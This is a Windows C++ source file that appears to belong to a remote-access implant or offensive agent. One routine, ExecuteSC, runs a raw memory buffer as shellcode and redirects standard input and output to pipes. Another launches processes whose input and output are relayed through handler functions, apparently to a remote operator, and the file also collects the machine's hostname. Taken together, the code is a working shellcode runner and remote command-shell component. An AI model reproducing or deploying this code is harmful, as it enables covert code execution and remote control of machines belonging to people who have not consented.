#define _CRT_SECURE_NO_DEPRECATE 1
#include <Windows.h>
#include <stdio.h>

#include "child_process.h"
#include "pipes.h"
#include "..\debug.h"

#define BUFSIZE 4096

bool shutdownPipes = false;
bool processExited = false;
extern HANDLE stopEvent = NULL;
static HANDLE hChildStdinRd = NULL, hChildStdinWr = NULL, hChildStdoutRd = NULL, hChildStdoutWr = NULL, hStdout = NULL;

void cleanup()
{
	hChildStdinRd = NULL;
	hChildStdinWr = NULL;
	hChildStdoutRd = NULL;
	hChildStdoutWr = NULL;
	hStdout = NULL;
}

std::string get_hostname() {

	char buffer[256] = "";
	memset(buffer, 0, 256);

	DWORD size = sizeof(buffer);
	GetComputerNameEx(ComputerNameDnsHostname, buffer, &size);
	return std::string(buffer);
}

void ExecuteSCInner(PVOID pBuffer) {
	__try {
		VOID(*lpCode)() = (VOID(*)())pBuffer;
		lpCode();
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] Thread threw exception.\n");
	}
}

void ExecuteSC(PVOID pBuffer) {

	DWORD dwThreadId[2] = { 0 };
	HANDLE hThread[2] = { 0 };

	DebugFprintf(outlogfile, PRINT_ERROR, "[+] Creating stdin/stdout pipes.\n");

	// Create a pipe for the child process's STDOUT.
	if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, 0, 0)) {
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] Stdout pipe creation failed\n");
		return;
	}

	// Create a pipe for the child process's STDIN.
	if (!CreatePipe(&hChildStdinRd, &hChildStdinWr, 0, 0)) {
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] Stdin pipe creation failed\n");
		return;
	}

	// startup input/output handler threads
	hThread[0] = CreateThread(NULL, 0, ReadFromPipe, NULL, 0, &dwThreadId[0]);
	hThread[1] = CreateThread(NULL, 0, WriteToPipe, NULL, 0, &dwThreadId[1]);

	DebugFprintf(outlogfile, PRINT_ERROR, "[+] Executing shellcode.\n");

	SetStdHandle(STD_OUTPUT_HANDLE, hChildStdoutWr);
	SetStdHandle(STD_ERROR_HANDLE, hChildStdoutWr);
	SetStdHandle(STD_INPUT_HANDLE, hChildStdinRd);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	//Execute the actual shellcode
	ExecuteSCInner(pBuffer);
	processExited = true;

	DebugFprintf(outlogfile, PRINT_INFO1, "[-] Shellcode execution completed or stop event set.\n");

	// when process finished notify pipe thread to finish
	WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
	DebugFprintf(outlogfile, PRINT_INFO1, "[-] Pipe threads exited\n");

	//Get hostname
	std::string hostname = get_hostname();

	shutdownRemotePipeThreads = true;
	shutdown_pipes(hostname);
}

void CreateProcessWithPipeComm(std::string command)
{
	PROCESS_INFORMATION piProcInfo = { 0 };
	SECURITY_ATTRIBUTES saAttr = { 0 };
	DWORD dwThreadId[2] = { 0 };
	HANDLE hThread[2] = { 0 };

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Get the handle to the current STDOUT.
	hStdout = GetStdHandle(STD_OUTPUT_HANDLE);

	// Create a pipe for the child process's STDOUT.
	if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) {
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] Stdout pipe creation failed\n");
		return;
	}

	// Ensure the read handle to the pipe for STDOUT is not inherited.
	SetHandleInformation( hChildStdoutRd, HANDLE_FLAG_INHERIT, 0);

	// Create a pipe for the child process's STDIN.
	if (!CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0)) {
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] Stdin pipe creation failed\n");
		return;
	}

	// Ensure the write handle to the pipe for STDIN is not inherited.
	SetHandleInformation(hChildStdinWr, HANDLE_FLAG_INHERIT, 0);

	DebugFprintf(outlogfile, PRINT_ERROR, "[+] Creating pipes.\n");

	// startup input/output handler threads
	hThread[0] = CreateThread(NULL, 0, ReadFromPipe, NULL, 0, &dwThreadId[0]);
	hThread[1] = CreateThread(NULL, 0, WriteToPipe, NULL, 0, &dwThreadId[1]);
	//hThread[2] = stopEvent;

	DebugFprintf(outlogfile, PRINT_ERROR, "[+] Creating process.\n");

	//Create stop event;
	stopEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

#ifdef _DEBUG
	////Close the debug file so it doesn't get passed to child process
	if (outlogfile != stdout)
		fclose(outlogfile);
#endif

	// start the new process
	CreateChildProcess(command, &piProcInfo);


#ifdef _DEBUG
	//Open it back up
	if (outlogfile != stdout) {
		fopen_s(&outlogfile, "C:\\debug.txt", "a+");
		setvbuf(outlogfile, NULL, _IONBF, 0);
	}
#endif

	// wait for process to finish
	//Add the manager terminate event
	HANDLE  handles[2] = { stopEvent, piProcInfo.hProcess };
	DWORD handleIdx = WaitForMultipleObjects(2, handles, FALSE/*bWaitAll*/, INFINITE);
	processExited = true;

	//Get exit code
	DWORD exit_code;
	GetExitCodeProcess(piProcInfo.hProcess, &exit_code);

	DebugFprintf(outlogfile, PRINT_INFO1, "[-] Process exited or stop event set. Code: %d\n", exit_code);

	// when process finished notify pipe thread to finish
	WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
	DebugFprintf(outlogfile, PRINT_INFO1, "[-] Pipe threads exited\n");

	//Get hostname
	std::string hostname = get_hostname();

	shutdownRemotePipeThreads = true;
	shutdown_pipes(hostname);
}

static void CreateChildProcess(std::string command, PROCESS_INFORMATION *piProcInfo)
{
	STARTUPINFO siStartInfo;
	BOOL bFuncRetn = FALSE;

	// Set up members of the PROCESS_INFORMATION structure.
	ZeroMemory( piProcInfo, sizeof(PROCESS_INFORMATION) );

	// Set up members of the STARTUPINFO structure.
	ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = hChildStdoutWr;
	siStartInfo.hStdOutput = hChildStdoutWr;
	siStartInfo.hStdInput = hChildStdinRd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	bFuncRetn = CreateProcess(NULL, (LPSTR)command.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, piProcInfo);
	if (bFuncRetn == 0)
		DebugFprintf(outlogfile, PRINT_ERROR, "[-] Failed to create new process: %d\n", GetLastError());
}

// thread function for writing to stdin
static DWORD WINAPI WriteToPipe(LPVOID p)
{
	char* input = nullptr;
	size_t inputLen = 0;
	BOOL ret = FALSE;
	DWORD dwWritten = 0;

	while(!shutdownPipes) {
		ret = handle_input_string(&input, &inputLen);
		if (ret == TRUE) {
			if (input != nullptr && inputLen > 0) {
				ret = WriteFile(hChildStdinWr, input, (DWORD)inputLen, &dwWritten, NULL);
				free(input);
				input = nullptr;
				inputLen = 0;

				if (ret == FALSE)
					break;
			}
		}
		else
			break;

		//Break out of thread if process exited
		if (processExited)
			break;
		
		Sleep(50);
	}
	DebugFprintf(outlogfile, PRINT_INFO3, "[*] Exiting WriteToPipe (Process)\n");

   	return 0;
}

// thread function for reading process stdout
static DWORD WINAPI ReadFromPipe(LPVOID p)
{
   DWORD dwRead = 0;
   CHAR chBuf[BUFSIZE] = { 0 };

   while (!shutdownPipes) {
	   // read from stdout buffer
	   DWORD bytesRead = 0, bytesAvail = 0, bytesLeft = 0;
	   BOOL ret = PeekNamedPipe(hChildStdoutRd, NULL, 0, &bytesRead, &bytesAvail, &bytesLeft);
	   if (ret == TRUE && bytesAvail > 0) {
		   if (!ReadFile(hChildStdoutRd, chBuf, BUFSIZE, &dwRead, NULL) || dwRead == 0) {
			   break;
		   }

		   if (dwRead > 0) {
			   DebugFprintf(outlogfile, PRINT_INFO3, "[*] Bytes Read: %d\n", dwRead);
			   handle_output_string(chBuf, dwRead);

			   // clear read buffer
			   memset(chBuf, 0, sizeof(chBuf));
			   dwRead = 0;
		   }
	   }
	   else {
		   //Break out of thread if process exited
		   if (processExited)
			   break;
		   
		   Sleep(50);
	   }
   }
   DebugFprintf(outlogfile, PRINT_INFO3, "[*] Exiting ReadFromPipe (Process)\n");

   return 0;
}
